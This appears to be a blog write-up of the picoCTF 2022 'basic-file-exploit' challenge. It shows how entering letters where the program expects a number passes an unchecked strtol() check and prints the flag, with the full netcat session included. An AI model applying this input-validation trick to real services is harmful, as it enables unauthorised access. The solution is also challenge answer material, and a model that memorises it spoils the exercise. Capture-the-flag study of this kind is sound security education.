---
title: "pico22/pwn: basic-file-exploit"
date: 2022-04-05 12:16:07
categories:
- ctfs
- pico22
- pwn
tags:
- pwn
description: "Learn how to pass unexpected datatypes into ELF binaries to break the code! This is my writeup for the picoCTF 2022 binary/pwn challenge \"basic-file-exploit\"."
permalink: ctfs/pico22/pwn/basic-file-exploit/
thumbnail: /asset/banner/banner-basic-file-exploit.png
---

<style>
    .box {
        border: 1px solid rgb(23, 25, 27);
        border-radius: 5px;
        background-color: rgb(23, 25, 27);
        padding: 1rem;
        font-size: 90%;
        text-align: center;
        margin-top: 1rem;
        margin-bottom: 1rem;
    }
    .flex-container {
        display: flex;
        flex-wrap: nowrap;
        justify-content: center;
    }
</style>

<p class="box">
The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it!<br>Connect to the program with netcat: <code>$ nc saturn.picoctf.net 50366</code><br>
The program's source code with the flag redacted can be downloaded  <a href="/asset/pico/program-redacted.c">here</a>.</p>

Let's run that `nc` command to see what's going on:

<figure class="highlight console">
  <table>
    <tr>
      <td class="code">
        <pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc saturn.picoctf.net 50366</span></span><br><span class="line">Hi, welcome to my echo chamber!</span><br><span class="line">Type &#x27;1&#x27; to enter a phrase into our database</span><br><span class="line">Type &#x27;2&#x27; to echo a phrase in our database</span><br><span class="line">Type &#x27;3&#x27; to exit the program</span><br></pre>
      </td>
    </tr>
  </table>
</figure>

Since this is binary exploitation, we're probably looking for something that the user can input which breaks the code.
To see what we can break, open `program-redacted.c` with `nano`:

<figure class="highlight console">
  <table>
    <tr>
      <td class="code">
        <pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nano program-redacted.c</span></span><br></pre>
      </td>
    </tr>
  </table>
</figure>

Let's look for the flag:

```c
static const char* flag = "[REDACTED]";
```

Well, that doesn't help. We'll keep searching to see what prints this `const` to figure out how to trigger it on the serverside:

```c
if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
  }
```

Here, the flag is going to be printed if a specific condition is met. Google defines `strtol()` as a function that "converts the initial part of the string in **str** to a **long int** value according to the given **base**". To break it, we need to input something that is **unconvertible into a long integer**. In this case, it would be letters! This statement is within the `static void data_read()` function. Let's see where it's called:

```c
 } else if (command == 2) {
      if (inputs == 0) {
        puts("No data yet");
        continue;
      }
      data_read();
      puts("Read successful, would you like to do anything else?");
```

We should be pressing the command `2` to read from the stored data (once we write it with the `1` command). Once it prompts us with "Read successful..." we should input letters to break it. Let's head back to the `netcat` and test it out:

<figure class="highlight console">
  <table>
    <tr>
      <td class="code">
        <pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc saturn.picoctf.net 50366</span></span><br><span class="line">Hi, welcome to my echo chamber!</span><br><span class="line">Type &#x27;1&#x27; to enter a phrase into our database</span><br><span class="line">Type &#x27;2&#x27; to echo a phrase in our database</span><br><span class="line">Type &#x27;3&#x27; to exit the program</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">Please enter your data:</span><br><span class="line">hello</span><br><span class="line">hello</span><br><span class="line">Please enter the length of your data:</span><br><span class="line">5</span><br><span class="line">5</span><br><span class="line">Your entry number is: 1</span><br><span class="line">Write successful, would you like to do anything else?</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line">Please enter the entry number of your data:</span><br><span class="line">&quot;NO!&quot;</span><br><span class="line">&quot;NO!&quot;</span><br><span class="line">picoCTF&#123;M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_<span style="color:#696969"><b>[REDACTED]</b></span>&#125;</span><br></pre>
      </td>
    </tr>
  </table>
</figure>


<a href="https://info.flagcounter.com/8Xkk"><img src="https://s01.flagcounter.com/count2/8Xkk/bg_212326/txt_C9CACC/border_C9CACC/columns_3/maxflags_12/viewers_3/labels_0/pageviews_1/flags_1/percent_0/" alt="Free counters!" border="0"></a>
